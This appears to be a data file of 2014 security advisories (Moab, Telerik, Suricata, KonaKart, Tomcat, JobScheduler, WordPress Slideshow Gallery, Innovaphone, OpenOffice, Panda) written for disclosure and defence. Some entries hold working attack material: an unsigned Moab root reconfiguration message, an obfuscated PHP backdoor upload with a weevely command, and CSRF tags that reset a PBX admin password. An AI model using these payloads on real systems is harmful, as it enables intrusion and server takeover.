Vendor: Adaptive Computing
Vendor Response: Resolved in Moab 7.2.9 and Moab 8
##[Description]
It is possible to bypass authentication within Moab in order to impersonate and run commands/operations as arbitrary users. The issue is believed to affect all versions of Moab prior to versions 7.2.9 and Moab 8.
##[Impact]
Successful exploitation could lead to remote code execution.
##[Cause]
The Moab server does not appropriately authenticate requests.
##[Solution]
Upgrade to Moab 7.2.9, Moab 8, or a later version of the software. Beta versions of Moab 8 are affected by this issue. This issue also affects versions of Moab which are using Munge for authentication.
This issue is believed to affect all instances of Moab prior to version 7.2.9 and 8. MWR are not aware of any alternate workaround for this issue.
##[Technical Details]
Moab is a workload manager used in High Performance Computing (HPC) environments. In a typical environment a user submits their jobs to the Moab server for it to handle the workload. This communication makes use of an XML based protocol, and example job submission is shown below:
<Envelope component=""ClusterScheduler"" count=""1"" name=""moab"" type=""nonblocking"" version=""8.0.beta.2"">
<Signature>
<DigestValue>7v49VzAlbyNQ4O3VChCus+v2LeE=</DigestValue>
<SignatureValue>QG13cmxhYnMgRWFzdGVyIEVnZyE=</SignatureValue>
</Signature>
<Body actor=""test"" timestamp=""1408488412"">
<Request action=""submit"" actor=""test"" cmdline=""STARTmsub"">
<Object>job</Object>
<job>
<Owner>test</Owner>
<UserId>test</UserId>
<GroupId>test</GroupId>
<InitialWorkingDirectory>/home/test</InitialWorkingDirectory>
<UMask>2</UMask>
<Executable>/usr/bin/id</Executable>
<SubmitLanguage>PBS</SubmitLanguage>
<SubmitString>START/usr/bin/idaa</SubmitString>
</job>
</Request>
</Body>
</Envelope>
Contained within this message is a <Signature> element, which contains both a <DigestValue> and <SignatureValue> elements. The <DigestValue> is simply a SHA1 sum of the <Body> element. The <SignatureValue>, however, is computed based upon a key (.moab.key) which is read by a setuid root binary (mauth) which performs some additional verification of the user before providing a signature for the message. This use of signatures is intended to prevent users from being able to craft arbitrary messages as the signature value is validated by the Moab server. Messages containing an incorrect signature for the message will be rejected.
However, whilst an incorrect SignatureValue results in a rejected message, it was found that if no signature is supplied then the signature checks are skipped and the remainder of the message processed. As a result it is possible to craft arbitrary messages and these messages will be accepted and honoured by the server as long as the message does not include a <Signature> element.
The following message contains no signature element and therefore will be accepted by the server:
<Envelope component=""ClusterScheduler"" count=""1"" name=""moab"" type=""nonblocking"" version=""8.0.beta.2"">
<Body actor=""test"" timestamp=""1408488412"">
<Request action=""submit"" actor=""test"" cmdline=""STARTmsub"">
<Object>job</Object>
<job>
<Owner>test</Owner>
<UserId>test</UserId>
<GroupId>test</GroupId>
<InitialWorkingDirectory>/home/test</InitialWorkingDirectory>
<UMask>2</UMask>
<Executable>/usr/bin/id</Executable>
<SubmitLanguage>PBS</SubmitLanguage>
<SubmitString>START/usr/bin/idaa</SubmitString>
</job>
</Request>
</Body>
</Envelope>
With no signing taking place an adversary can specify arbitrary users for these operations to be performed under, and thus impersonate other users including executing jobs as other users.
##[Proof of Concept]
In addition to job submission Moab also provides the ability to dynamically reconfigure the Moab server remotely. Whilst a default Moab installation will not permit the submission of root jobs it is possible to exploit this vulnerability in order to dynamically reconfigure Moab to allow root job submissions. The following request achieves this and due to its simple nature makes a useful proof of concept (the timestamp value may require altering):
00000238
<Envelope component=""ClusterScheduler"" count=""1"" name=""moab"" version=""8.0.beta.2""><Body actor=""root"" timestamp=""1404856164""><Request action=""modify"" actor=""root"" args=""ALLOWROOTJOBS TRUE""><Object>sched</Object></Request></Body></Envelope>
Sending the entire message above (including the size value) will enable root jobs on a vulnerable server.
##[Detailed Timeline]
2014-07-08 : Vulnerability identified and detailed information passed to Adaptive
2014-07-09 : Adaptive inform MWR that code changes are being made to address the issue
2014-07-11 : Adaptive inform MWR that regression testing has identified an additional issue
2014-07-14 : Moab 8 released
2014-08-20 : Limited status update provided by Adaptive suggesting a 7.2 fix will emerge
2014-09-08 : Release of advisory to HPC community
2014-09-16 : Moab 7.2.9 released
2014-09-25 : Public release of advisory
http://labs.mwrinfosecurity.com"
6162,CVE-2014-4958: Stored Attribute-Based Cross-Site Scripting (XSS) Vulnerability in Telerik UI for ASP.NET AJAX RadEditor Control,,CVE-2014-4958,"All versions of the popular UI for ASP.NET AJAX RadEditor Control product by Telerik may be affected by a high-risk stored attribute-based cross-site scripting (XSS) vulnerability that is assigned CVE-2014-4958. This WYSIWYG rich text editor is �...what Microsoft chose to use in MSDN, CodePlex, TechNet, MCMS and even as an alternative to the default editor in SharePoint.�
Personally tested and confirmed are versions: 2014.1.403.35 (much newer) and 2009.3.1208.20 (much older) using Internet Explorer 8, version 8.0.7601.17514. However, all versions from Telerik at this time may be vulnerable and will continue to be until a patched is released. A workaround may be available.
More information on the vulnerability: http://maverickblogging.com/disclosing-cve-2014-4958-stored-attribute-based-cross-site-scripting-xss-vulnerability-in-telerik-ui-for-asp-net-ajax-radeditor-control/
Remediation: Telerik states: We have applied a patch to the editor that will be delivered with our Q3 edition of the controls that should be released towards the end of October. A blog post on the issue has been published here: http://blogs.telerik.com/blogs/14-09-24/securing-radeditor-content-and-preventing-xss-attacks
Additional credit goes to Tyler Hoyle and the rest of my team in CGI Federal�s Emerging Technologies Security Practice for their hard work."
6183,CVE-2014-6603 suricata 2.0.3 Out-of-bounds access in SSH parser,,CVE-2014-6603,"CVE-2014-6603 suricata 2.0.3 Out-of-bounds access in SSH application parser
1. Background
Suricata is a high performance Network IDS, IPS and Network Security Monitoring engine developed by the Open Information Security Foundation (OISF).
2. Summary Information
It was found out that the application parser for SSH integrated in Suricata contains a flaw that might lead to an out-of-bounds access. For this reason a Denial of Service towards the Suricata monitoring software might be possible using crafted packets on the monitoring interface.
3. Technical Description
The application parser for SSH (src/app-layer-ssh.c) contains a function SSHParseBanner. In case the parsed buffer is either
""SSH-2.0 -MySSHClient-0.5.1 ""
or
""SSH-2.0- MySSHClient-0.5.1 ""
the function will behave in the wrong way and attempt either a very big memory allocation or an out of bounds array access with negative index, which also might lead to out-of-bounds write access under certain conditions. The problem is caused due to the fact that the end of the banner and start of the software version are computed independently.
4. Affected versions
Affected versions are Suricata 2.0.3 and 2.1beta1, older versions might be affected as well.
5. Fix
The issue will be fixed in Suricata 2.0.4 and in the next upcoming major release. See http://suricata-ids.org/2014/09/23/suricata-2-0-4-available/ for reference.
6. Advisory Timeline
2014-09-10: Discovered
2014-09-12: Reported to vendor by email
2014-09-12: Vendor responded, confirmed and provided preliminary fix
2014-09-17: Requested CVE
2014-09-19: CVE number received
2014-09-23: Vendor reported a fixed version released
2014-09-23: Published
7. Credit
The issue was found by
Steffen Bauch
Twitter: @steffenbauch
http://steffenbauch.de
8. References
http://www.openinfosecfoundation.org/
http://suricata-ids.org/
http://suricata-ids.org/2014/09/23/suricata-2-0-4-available/"
6195,"CVE-2014-5516 CSRF protection bypass in ""KonaKart"" Java eCommerce product",,CVE-2014-5516,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-5516
===================
""Cross-Site Request Forgery (CSRF) protection bypass"" (CWE-352) vulnerability
in ""KonaKart Storefront Application"" Enterprise Java eCommerce product
Vendor
===================
DS Data Systems (UK) Ltd.
Product
===================
""KonaKart is an affordable java based shopping cart software solution for online retailers.
Let KonaKart help increase your eCommerce sales.""
- source: http://www.konakart.com
""KonaKart is a Java eCommerce system aimed at medium to large online retailers.""
- source: https://en.wikipedia.org/wiki/KonaKart
Affected versions
===================
This vulnerability affects versions of KonaKart Storefront Application prior to 7.3.0.0
Patch
===================
The vendor has released a XSRF fix as part of version 7.3.0.0 at
http://www.konakart.com/downloads/ver-7-3-0-0-whats-new
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
Medium
Description
===================
The existing CSRF protection token was checked for every POST request
properly. When modifying the request from POST method to GET method
all state-changing actions worked as well, but the CSRF token protection
was no longer enforced, allowing CSRF attacks.
Escalation potential
====================
Exploitation demonstration was responsibly provided along with the vulnerability
report to the vendor, which changed a victim's mail address (using the CSRF
protection bypass) to an attacker-supplied mail address, allowing a successful
reset of victim's account password by the attacker.
Timeline
===================
2014-05-02 Vulnerability discovered
2014-05-02 Vulnerability responsibly reported to vendor
2014-05-02 Reply from vendor acknowledging report
2014-??-?? Vendor released patch as part of version 7.3.0.0
2014-09-20 Advisory published via BugTraq
References
===================
http://www.konakart.com/downloads/ver-7-3-0-0-whats-new
http://www.christian-schneider.net/advisories/CVE-2014-5516.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iEYEARECAAYFAlQd69cACgkQXYAsOfddvFOTVACgr/f5+x5kf60t5LaCqhH0pvSY
QYoAnjiI0WSa3iGuw/OfXk3/vLV+liFm
=61mn
-----END PGP SIGNATURE-----"
6240,[SECURITY] CVE-2013-4444 Remote Code Execution in Apache Tomcat,,CVE-2013-4444,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2013-4444 Remote Code Execution
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 7.0.0 to 7.0.39
Description:
In very limited circumstances, it was possible for an attacker to upload
a malicious JSP to a Tomcat server and then trigger the execution of
that JSP. While Remote Code Execution would normally be viewed as a
critical vulnerability, the circumstances under which this is possible
are, in the view of the Tomcat security team, sufficiently limited that
this vulnerability is viewed as important.
For this attack to succeed all of the following requirements must be met:
a) Using Oracle Java 1.7.0 update 25 or earlier (or any other Java
implementation where java.io.File is vulnerable to null byte
injection).
b) A web application must be deployed to a vulnerable version of Tomcat
(see previous section).
c) The web application must use the Servlet 3.0 File Upload feature.
d) A file location within a deployed web application must be writeable
by the user the Tomcat process is running as. The Tomcat security
documentation recommends against this.
e) A custom listener for JMX connections (e.g. the JmxRemoteListener
that is not enabled by default) must be configured and be able to
load classes from Tomcat's common class loader (i.e. the custom JMX
listener must be placed in Tomcat's lib directory)
f) The custom JMX listener must be bound to an address other than
localhost for a remote attack (it is bound to localhost by default).
If the custom JMX listener is bound to localhost, a local attack
will still be possible.
Note that requirements b) and c) may be replaced with the following
requirement:
g) A web application is deployed that uses Apache Commons File Upload
1.2.1 or earlier.
In this case a similar vulnerability may exist on any Servlet container,
not just Apache Tomcat.
Mitigation:
This vulnerability may be mitigated by using any one of the following
mitigations:
- - Upgrade to Oracle Java 1.7.0 update 40 or later (or any other Java
implementation where java.io.File is not vulnerable to null byte
injection).
- - Use OS file permissions to prevent the process Tomcat is running as
from writing to any location within a deployed application.
- - Disable any custom JMX listeners
- - Upgrade to Apache Tomcat 7.0.40 or later
Credit:
This issue was identified by Pierre Ernst of the VMware Security
Engineering, Communications & Response group (vSECR) and reported to
the Tomcat security team via the Pivotal security team.
References:
[1] http://tomcat.apache.org/security-7.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.22 (Darwin)
Comment: GPGTools - http://gpgtools.org
iQIcBAEBAgAGBQJUEFl4AAoJEBDAHFovYFnnR3cQAL034ZrbUeBcJ4zotNp5+ea2
llNatC3MUlg/vZ2qG8Qo4xxbdS4F53cpu90fFhKm+dFzIiRhZeHROYDv6Lu1biSu
Nvq0YXV6KVJ9Js4G6HFilhy3vownvn/hMAjzmPojSYjWO5slXNfFvAlwyRrGt0Cp
t5rUh4QNavhgO4m0HXJJLg+PNlSKsnGdra+0gWmq8YKtKotgu24SbPq/p3HP7TuJ
nnMjx4A6r2LcoghL/nFAPp2ZwgBCtm67osObJ1uMxYhZ2I/3MztFYpSKvfVONuUK
rL265wmrKLvvDdozd/Aw2d2poXdSO/oWeuhKbbzYOxpUT6iRzf+BkPUR99e6Rqso
lOfLoAYuzYfK4rW/ooxVNKnHMhs+0BVfNZoclKCDSvz+a9dIVS5XD6KcyJQ3uv12
ujyTGaGhLuS/ciAVS372Dx8H0/mfd5nZCkYL6NDyzSWSmb5eG4XxqrLi77yByvAT
ulSAyg1UWk8sRgQ4AY3belH3jDiN1rHSWJAaB+WVwszQdCe4iXgDyB1u4ES22oAN
Ymrg5l7tLQ8/9LyMvlQ0tE4f+OYE6kki6e4JMc2cMqPL/rcjiUnLWZ7YUyx92RM1
LRt9QhMd1h3Uwle7a7LxqJCGf/rIPwRmrjTYYWt43np1Adx7y2RuZOTDjEY98sN3
oCLjuSCalVcBX9hGaJ7n
=98BB
-----END PGP SIGNATURE-----"
6250,"CVE-2014-5393 Path Traversal to Sensitive Files in Webroot in ""JobScheduler""",,CVE-2014-5393,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-5393
===================
""Path Traversal to Sensitive Files in Webroot"" (CWE-219) vulnerability in ""JobScheduler"" product
Vendor
===================
Software- & Organisations-Service GmbH
Product
===================
""JobScheduler is a workload automation tool. It is used to launch JobScheduler objects,
such as jobs and/or orders, at the occurrence of time, file or calendar events. JobScheduler
was recognised in 2012 by Gartner Inc. with a placement in their Magic Quadrant for workload
automation. JobScheduler provides solutions from simple to complex scheduling scenarios.
It is available with an open source or a commercial licence.""
- source: http://www.sos-berlin.com/modules/cjaycontent/index.php?id=osource_scheduler_introduction_en.htm
Affected versions
===================
This vulnerability affects versions of JobScheduler prior to 1.7.4241
as well as versions prior to 1.6.4246.
Patch
===================
The vendor has released patches for versions 1.7.x and 1.6.x at
http://www.sos-berlin.com/modules/news/article.php?storyid=73
http://www.sos-berlin.com/modules/news/article.php?storyid=74
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
High
Description
===================
Using specially crafted requests to access the web interface of JobScheduler it is possible
as an underprivileged user (""info"" permission) to list directories and read contents of
(sensitive) files from the installation of the JobScheduler web interface, which includes
datasource configurations (for example hibernate.cfg.xml and sos_settings.ini) as well
as permission config files (scheduler.xml). These can include passwords, depending on
which auth backend was defined. This can also be misused to escalate to the higher ""all""
permission from the lower ""info"" permission.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
References
===================
http://www.sos-berlin.com/modules/news/article.php?storyid=73
http://www.sos-berlin.com/modules/news/article.php?storyid=74
http://www.christian-schneider.net/advisories/CVE-2014-5393.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iEYEARECAAYFAlQMj90ACgkQXYAsOfddvFM/UQCgvXLY95yZREDrIhvedQN30oKg
rEcAnR6qWeGTl4LKxpOj/JX+THE4gQ1+
=FhON
-----END PGP SIGNATURE-----"
6251,"CVE-2014-5392 XML eXternal Entity (XXE) in ""JobScheduler""",,CVE-2014-5392,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-5392
===================
""XML eXternal Entity (XXE)"" (CWE-611) vulnerability in ""JobScheduler"" product
Vendor
===================
Software- & Organisations-Service GmbH
Product
===================
""JobScheduler is a workload automation tool. It is used to launch JobScheduler objects,
such as jobs and/or orders, at the occurrence of time, file or calendar events. JobScheduler
was recognised in 2012 by Gartner Inc. with a placement in their Magic Quadrant for workload
automation. JobScheduler provides solutions from simple to complex scheduling scenarios.
It is available with an open source or a commercial licence.""
- source: http://www.sos-berlin.com/modules/cjaycontent/index.php?id=osource_scheduler_introduction_en.htm
Affected versions
===================
This vulnerability affects versions of JobScheduler prior to 1.7.4241
as well as versions prior to 1.6.4246.
Patch
===================
The vendor has released patches for versions 1.7.x and 1.6.x at
http://www.sos-berlin.com/modules/news/article.php?storyid=73
http://www.sos-berlin.com/modules/news/article.php?storyid=74
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
High
Description
===================
Using a specially crafted request to access the web interface of JobScheduler it is possible
to cause denial of service situations as well as list directories and contents of (sensitive)
files from the filesystem of the server which has the JobScheduler web interface installed.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
References
===================
http://www.sos-berlin.com/modules/news/article.php?storyid=73
http://www.sos-berlin.com/modules/news/article.php?storyid=74
http://www.christian-schneider.net/advisories/CVE-2014-5392.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iEYEARECAAYFAlQMj9cACgkQXYAsOfddvFOj9QCgg/hPe645bRJD8ZZ2E1yIWBMZ
rQQAnR9gZq7TOhZZxAD6tbZ3WHfsqjDq
=HlF4
-----END PGP SIGNATURE-----"
6252,"CVE-2014-5391 DOM-based Cross-Site Scripting (XSS) in ""JobScheduler""",,CVE-2014-5391,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-5391
===================
""DOM-based Cross-Site Scripting (XSS)"" (CWE-79) vulnerability in ""JobScheduler"" product
Vendor
===================
Software- & Organisations-Service GmbH
Product
===================
""JobScheduler is a workload automation tool. It is used to launch JobScheduler objects,
such as jobs and/or orders, at the occurrence of time, file or calendar events. JobScheduler
was recognised in 2012 by Gartner Inc. with a placement in their Magic Quadrant for workload
automation. JobScheduler provides solutions from simple to complex scheduling scenarios.
It is available with an open source or a commercial licence.""
- source: http://www.sos-berlin.com/modules/cjaycontent/index.php?id=osource_scheduler_introduction_en.htm
Affected versions
===================
This vulnerability affects versions of JobScheduler prior to 1.7.4241
as well as versions prior to 1.6.4246.
Patch
===================
The vendor has released patches for versions 1.7.x and 1.6.x at
http://www.sos-berlin.com/modules/news/article.php?storyid=73
http://www.sos-berlin.com/modules/news/article.php?storyid=74
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
Medium
Description
===================
Using a specially crafted request to access the web interface of JobScheduler it
is possible to execute DOM-based Cross-Site Scripting (XSS) attacks. The content of
the hash-part is written using document.write() from location.hash directly into the HTML,
resulting in the DOM-based XSS.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
References
===================
http://www.sos-berlin.com/modules/news/article.php?storyid=73
http://www.sos-berlin.com/modules/news/article.php?storyid=74
http://www.christian-schneider.net/advisories/CVE-2014-5391.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iEYEARECAAYFAlQMj9AACgkQXYAsOfddvFP1zACbBDDli1L+Z+UEiBAc3YuczK3E
ST4An0a4USOGAADdmumbPAhrYPQbUKQS
=q+4o
-----END PGP SIGNATURE-----"
6301,WordPress Slideshow Gallery 1.4.6 Shell Upload Vulnerability (CVE-2014-5460),,CVE-2014-5460,"WordPress Slideshow Gallery plugin version 1.4.6 suffers from a remote shell upload vulnerability.
Vendor Homepage: http://tribulant.com/
Software: Slideshow Gallery
Version: 1.4.6
Software Link: http://downloads.wordpress.org/plugin/slideshow-gallery.1.4.6.zip
Tested on: Windows 7 OS, Wordpress 3.9.2 and Chrome Browser.
Description:
I found a serious security vulnerability in the Slideshow Gallery plugin. This bug allows an attacker to upload any php file remotely to the vulnerable website (administrator by default).
I have tested and verified that having the current version of the plugin installed in a WordPress installation will allow any registered user (Administrator, Editor, Author, Contributor and Subscriber), to upload a PHP shell to exploit the host system.
Backdoor location: http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/backdoor.php
Today (2014-08-29), I did the notification to vendor and they gave me feedback about the vulnerability by email. The vendor has released a patch a few hours ago. (SlideShow Gallery version 1.4.7 at https://wordpress.org/plugins/slideshow-gallery/changelog).
Slideshow Gallery 1.4.7
FIX: Possible shell exploit by uploading PHP file as slide
Proof of Concept (PoC):
1.An attacker uploads a PHP shell file (i.e. backdoor.php):
POST http://192.168.31.128/wordpress/wp-admin/admin.php?page=slideshow-slides&method=save HTTP/1.1
Content-Type: multipart/form-data
Content-Disposition: form-data; name=""image_file""; filename=""backdoor.php""
Content-Type: application/octet-stream
<?php
$kvgk = str_replace(""y"","""",""ysytyry_yreypylyayce"");
$dawj=""pdGV4cGxvaXQnO2VzhjaGzh8gJzwnLiRrzhLic+JzzhtldmFsKGJhc2U2NF9kZWNvZGUz"";
$asrp=""gnJywnKycpLCBqb2luKGFycmF5X3NsaWNlKCRhLCRjKzhCRhKS0zKSkpKSk7ZWzhNobyAnPC8nLzhiRrLic+Jzt9"";
$gxfr=""hocHJlZ19yzhZXBsYzhWNlKzhGFycmF5KCcvW15cdz1cc1zh0vJywnzhLzh1xzzhLycpLCBhcnJheSzh"";
$fdcd=""JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihzhyZXNldCgkYSk9PSd3zhaCcgJiYgJGMzhoJGEpPjMpezhyRrPSd"";
$uuod = $kvgk(""j"", """", ""bjase6j4j_jdjejcjojde"");
$qcon = $kvgk(""av"","""",""avcraveaavteav_avfavuavnavcavtiavoavn"");
$rpgy = $qcon('', $uuod($kvgk(""zh"", """", $fdcd.$dawj.$gxfr.$asrp))); $rpgy();
?>
2.The backdoor is located at http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/backdoor.php
3.The attacker uses a security tool (i.e. weevely) in order to communicate with the backdoor.
#weevely http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/backdoor.php whitexploit
4.Now the attacker has a �telnet-like console�. Finally, the attacker has the remote control of the vulnerable website.
Vulnerability Disclosure Timeline:
2014-08-28: Discovered vulnerability
2014-08-29: Vendor Notification (support tribulant com)
2014-08-29: Vendor Response/Feedback
2014-08-29: Vendor Fix/Patch
2014-08-30: Public Disclosure
Found by: Jes�s Ram�rez Pichardo
@whitexploit
http://whitexploit.blogspot.mx/
Date: 2014-08-28"
6329,[CVE-2014-5335] CSRF in Innovaphone PBX,,CVE-2014-5335,"Title: Innovaphone PBX Admin-GUI CSRF
Impact: High
CVSS2 Score: 7.8 (AV:N/AC:M/Au:S/C:P/I:C/A:C/E:F/RL:U/RC:C)
Announced: August 21, 2014
Reporter: Rainer Giedat (NSIDE ATTACK LOGIC GmbH, www.nsideattacklogic.de)
Products: Innovaphone PBX Administration GUI
Affected Versions: all known versions (tested 10.00 sr11)
CVE-id: CVE-2014-5335
Summary
=======
The innovaphone PBX is a powerful and sophisticated VoIP telephone system for use in professional business environments. In addition to a wide range of IP telephony functionalities, the innovaphone PBX is also equipped with a perfectly integrated Unified Communications solution that can be enabled as needed at any time and at any workspace.
The innovaphone PBX uses a web-based user interface. This UI is vulnerable to cross-site request forgery attacks (CSRF).
Description
===========
The UI does not check if a request was sent originating from a page it delivered before or from an untrusted and potentially malicious source. With a CSRF attack a malicious third party is able to change any configurable items from remote if an administrator is logged in to the user interface and visits a malicious website or clicks a manipulated link under the control of the attacker.
The lack of a logout mechanism and the use of the digest authentication scheme increases the probability of successful exploitation, because the user session will never expire automatically.
Impact
======
The attacker has full control over the innovaphone PBX and is able to manipulate every configuration item and user account data, as well as passwords. This can lead to the redirection of phone calls, denial of service and toll fraud by adding new SIP endpoints.
Proof on Concept
================
Visiting a web page including the following HTML image tag will change the administrator’s password of the innovaphone PBX to 'hacked':
<img src=""http://<<PBX>>/CMD0/mod_cmd.xml?cmd=form&redirect=mod_cmd.xml%3Fxsl%3Dcommand.xsl&name=&user=admin&password=hacked&password2=hacked&help=&add.user=&add.pwd=&add.pwd2=&add.level=0&add.end=&kdc.realm=&kdc.address1=&kdc.port1=&kdc.adminport1=&kdc.address2=&kdc.port2=&kdc.adminport2=&kdc.end=&op=OK""></img>
Visiting a web page including the following image will add a new SIP user:
<img src=""http://<<PBX>>/PBX0/ADMIN/mod_cmd_login.xml?cmd=submit-object&xsl=pbx_edit_user.xsl&tab-active=&guid=&repsrc=&search-grp=&text=&cn=Hans+Dampf&dn=Hans+Dampf&h323=Hans+Dampf&e164=666&email=&pwd=hans&pwd1=hans&node=root&loc=Opfer&fake=&obj-url=&gi=&config=&no-devs=update&dev1.hw=&dev1.text=&dev1.admin=on&dev1.no-filter=on&dev1.reg=on&filter=&cd-filter=&cfnr=&busy-out=&uc=&gw.name=&gw.ipei=&gw.dsp=&gw.ac=&gw.subs=&gw.fc=&gw.cki=&gw.ciph=&gw.end=.&save=Apply""></img>
Solution
========
Innovaphone recommends to use a dedicated browser only for administration tasks regarding the PBX and close all browser instances when administration is done.
More information can be found on the closed support wiki of innovaphone: http://wiki.innovaphone.com/index.php?title=Support:Protection_against_%22Cross-Site-Request-Forgery%22
This workaround makes sucessful exploitation harder, but an attacker may still be able to use special protocol-handlers to open URLs in different browsers.
No fix will be provided, since the vendor considers this to be a browser problem.
Timeline
========
2014-22-07 Bug found
2014-28-07 Vendor contact
2014-29-07 Vendor reply
2014-29-07 Technical details provided
2014-13-08 Vendor does not plan to patch for now, but provided a workaround
2014-21-08 Public release"
6330,CVE-2014-3575:OpenOffice Targeted Data Exposure Using Crafted OLE Objects,,CVE-2014-3575,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-3575
OpenOffice Targeted Data Exposure Using Crafted OLE Objects
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache OpenOffice 4.1.0 and older on Windows.
OpenOffice.org versions are also affected.
Description:
The exposure exploits the way OLE previews are generated to embed arbitrary file data into a specially crafted document when it is opened. Data exposure is possible if the updated document is distributed to other parties.
Mitigation:
Apache OpenOffice users are advised to upgrade to Apache OpenOffice 4.1.1. Users who are unable to upgrade immediately should be cautious when they are asked to ""Update Links"" for untrusted documents.
Credits:
The Apache OpenOffice security team credits Open-Xchange for reporting this flaw.
Herbert Dürr
Member of the Apache OpenOffice Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (Cygwin)
iQIcBAEBAgAGBQJT9e3wAAoJEDfnuKc+PLjJC8gP/2ZLgMRO9r2YyAbEWl6iA1gP
eVtq6I6O5W9a0ov1zGpbBaPVqZGMCGPDgsdTBUmm2FRAY0U0Yz0bflpGcSUdIpJ/
ULMp6TLfgb24PpiySOQHRvz/6QDsTTgkEyKClkM3THzvNXh6mSCExaDsDv8fseaJ
y1tvTRHrHLeG+lZKPwDnIvDYDSONYNksK/e7gcF5rjNZpmcl6F4gZmMcm1j1TP1a
HbsgOzMpC+A0X26VfuDapYBT6mjeITS6+ZReAcD3sPul95UK/BQ6qU29dvDY7uYg
7U9vzr2155uyv9qUx0UqE2XRKIHfUEhhxHZqFtTVlllkv34E1PNNYdhzUUYDuo4w
W4+GhrebUaArIeQNd1KLCgvnQ0O6ykegV/Rc+OIgG/8DOyC18SS3r11nLs0L0pDe
WmBfOii2OaS/d0RrOdHFsNpscSL1dRaGOXLDD5lxm2VPp6D3TgCM9UgNnBzF4u3S
4lKid1JlxswFbOOT0hNrX7V/kwx9Z2DfDzw8EmjLZGmiH1W3u99EZxmIlKZQRwrg
3enbMuSADsrWSjnxxmwlJD6iT0AaBEJ30doxqnfftIbNt4+r45fSPRPWYriQZ00j
7a+CrKLfBS9ctuXChldWGtgbh4Pkq3RxsVhAw7aiIQdII53v8086A/jzVU0zYNN8
AUxJRYsI1SGTlytbeP0o
=2Y3B
-----END PGP SIGNATURE-----"
6331,CVE-2014-3524: Apache OpenOffice Calc Command Injection Vulnerability,,CVE-2014-3524,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-3524
OpenOffice Calc Command Injection Vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache OpenOffice 4.1.0 and older on Windows.
OpenOffice.org versions may also be affected.
Description:
The vulnerability allows command injection when loading Calc spreadsheets. Specially crafted documents can be used for command-injection attacks. Further exploits are possible but have not been verified.
Mitigation:
Apache OpenOffice users are advised to upgrade to Apache OpenOffice 4.1.1. Users who are unable to upgrade immediately should be cautious when opening untrusted documents.
Credits:
The Apache OpenOffice security team credits Rohan Durve and James Kettle of Context Information Security as the discoverer of this flaw.
Herbert Dürr
Member of the Apache OpenOffice Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (Cygwin)
iQIcBAEBAgAGBQJT9e2fAAoJEDfnuKc+PLjJNT0P/1kg+qHwcuqDScV2HdOHbIP3
409ABpECFSLsAf4S6EwpBTeSBQoBCco+uyzMPJ9yOO6xcDdcuq2BF6vdBLL46UKC
WP+yy4G4BBAX/NnE+mTVT2Tc+JgwJJ6Zzd03JuIQo4T0qnsnYjfG7fAY9fx4vTc5
TAvFEakG8Nrrvoq5s856aKZdRlM5JMsUPzFd1JtsWopWmyRWHd9dNwJZJAmTr68F
3QeBONe9SKK1nb9TxQt5W4MUbraw6doN6q5bDa8eDJUiwzGraMqdCBTD2tVe09BF
Mi2TM6lJc4D27aZ8vMxZJTMWRGNGSU9fAuZYNmndXCYGk3rjKB6ghEfxK2DjaG5b
KuXAg6jg8Q+9CZNL769h1NIavj+Yhs7ouiFgS5gkb0l8oeU/UiCcmqq5y0cTzT43
Bu/5VYLj4dNq2XwwMLY7lzQeJ4xKS8WLmBEJ43v3Pocha5f020dftgH0D+sV3V8C
7Rn33gPrf5Ff/klGcvEUOkCRRalKI72CAN7c8AkPlNwWb4OhIQboSNRHF1jHm8Kb
mifIsECKudk8cKbKkiRuP9Eaq+nfZp/WswvmPboRuMdTLuT4vwGUTXzL7If8XDb6
a2a3Mc4Mr5unYVJLG3lS+VkozjQOVjjDwy8FuiZg/To/bsmZ5s+vURwHH8EGkUFN
N3jdeIXCa76iNNKuVPHF
=Ku0Y
-----END PGP SIGNATURE-----"
6336,CVE-2014-5307 - Privilege Escalation in Panda Security Products,,CVE-2014-5307,"Vulnerability title: Privilege Escalation in Panda Security
CVE: CVE-2014-5307
Vendor: Panda Security
Product: Multiple
Affected version: Panda 2014 Products
Fixed version: Hotfix hft131306s24_r1
Reported by: Kyriakos Economou
Details:
Latest, and possibly earlier builds, of the PavTPK.sys kernel mode
driver of Panda Security software suffer from a heap overflow bug that
allows any user to elevate their privileges through an IOCTL request and
execute code as SYSTEM by controlling the EIP via a corrupted kernel object.
This driver is loaded into kernel memory during boot time and stays
resident without touching the disk later.
All Panda Security products using the faulty driver were found to be
vulnerable.
